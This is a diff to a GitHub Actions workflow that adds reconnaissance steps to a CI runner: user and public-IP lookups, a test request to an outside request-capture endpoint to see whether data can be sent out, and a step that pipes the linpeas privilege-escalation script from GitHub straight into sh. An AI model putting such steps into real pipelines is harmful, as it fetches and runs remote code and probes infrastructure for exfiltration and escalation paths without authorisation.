@@ -8,7 +8,21 @@ jobs:
         run: echo "Starting"
       - name: System enumeration
         run: |
+          # get a list of all commands able to be run
           # compgen -c 
+          
+          # current user
           whoami
+          
+          # current ip address
           ip=$(curl ipv4.icanhazip.com) | curl ipinfo.io/$ip
+          
+          # can we post data to https://beeceptor.com/console/githubactions
           curl -v -X GET 'https://githubactions.free.beeceptor.com/my/api/path' -H 'some-header: some-value'
+
+          # ping doesnt work. maybe tcp ping?
+          # ping -c 4 8.8.8.8
+      - name: linpeas works
+        run: |
+          # check to see if we can get scripts and run them
+          curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
